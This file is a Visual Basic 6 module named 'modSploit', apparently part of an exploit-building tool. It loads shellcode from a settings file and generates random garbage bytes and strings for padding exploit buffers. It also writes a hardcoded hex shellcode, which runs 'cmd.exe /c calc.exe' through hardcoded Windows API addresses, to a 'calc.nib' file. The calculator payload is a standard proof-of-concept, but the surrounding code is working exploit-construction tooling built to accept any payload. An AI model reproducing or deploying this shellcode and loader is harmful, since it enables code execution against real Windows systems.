Attribute VB_Name = "modSploit"
Public Function returnShellcode(pathToSettings) As String
    returnShellcode = Replace(ReadFileIntoString(App.Path & "\" & pathToSettings), " ", "")
End Function

  

Public Function ReadFileIntoString(strFilePath As String) As String

    Dim fso As New FileSystemObject
    Dim ts As TextStream
    
    Set ts = fso.OpenTextFile(strFilePath)
    ReadFileIntoString = ts.ReadAll

End Function

Function Random(Lowerbound As Long, Upperbound As Long)
Randomize
Random = Int(Rnd * Upperbound) + Lowerbound
End Function

Public Function binaryGarbage(lengthz As Integer) As String
    'Generates garbage
    
    Dim tmpStr As String
    
    For i = 1 To lengthz
    tmpStr = tmpStr & Chr(Random(0, 255))
    Next
    
    binaryGarbage = tmpStr
    tmpStr = vbNullString
End Function

Public Function RandomString(cb As Integer) As String

    Randomize
    Dim rgch As String
    rgch = "abcdefghijklmnopqrstuvwxyz"
    rgch = rgch & UCase(rgch) & "0123456789"

    Dim i As Long
    For i = 1 To cb
        RandomString = RandomString & Mid$(rgch, Int(Rnd() * Len(rgch) + 1), 1)
    Next

End Function

Public Function setupShellcodes() As Boolean
    Dim calcShellcode As String
    
    calcShellcode = vbNullString
    calcShellcode = "eb1b5b31c05031c088431353bbad23867cffd331c050bbfaca817cffd3e8e0ffffff636d642e657865202f632063616c632e657865"
      
    If DirExists(App.Path & "/shellcodes") Then
      setupShellcodes = True
      Exit Function
    Else
      MkDir App.Path & "/shellcodes"
      
      Open App.Path & "/shellcodes/calc.nib" For Output As #1
        Print #1, , calcShellcode
      Close #1
      setupShellcodes = True
      Exit Function
    End If

End Function
